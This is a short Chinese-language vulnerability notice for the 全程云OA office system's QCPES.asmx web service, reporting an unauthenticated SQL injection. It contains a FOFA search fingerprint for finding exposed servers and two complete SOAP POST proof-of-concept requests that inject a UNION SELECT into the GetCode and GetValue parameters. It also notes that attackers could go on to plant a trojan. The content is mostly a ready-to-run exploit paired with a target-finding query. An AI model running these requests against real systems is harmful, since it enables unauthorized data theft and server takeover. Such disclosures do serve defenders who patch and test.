# 全程云OA系统QCPES.asmx存在SQL注入漏洞

全程云OA QCPES.asmx 接口多个实例处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息，在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## fofa

```javascript
body="images/yipeoplehover.png"
```

## poc

```javascript
POST /OA/PES/QCPES.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/GetCode"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetCode xmlns="http://tempuri.org/">
      <fk_parid>1' UNION ALL SELECT @@VERSION-- oCWH</fk_parid>
      <value>1</value>
    </GetCode>
  </soap:Body>
</soap:Envelope>
```

```javascript
POST /OA/PES/QCPES.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/GetValue"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetValue xmlns="http://tempuri.org/">
      <fk_parid>1</fk_parid>
      <code>1' UNION ALL SELECT @@VERSION-- oCWH</code>
    </GetValue>
  </soap:Body>
</soap:Envelope>
```

![image-20241106224830320](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411062248382.png)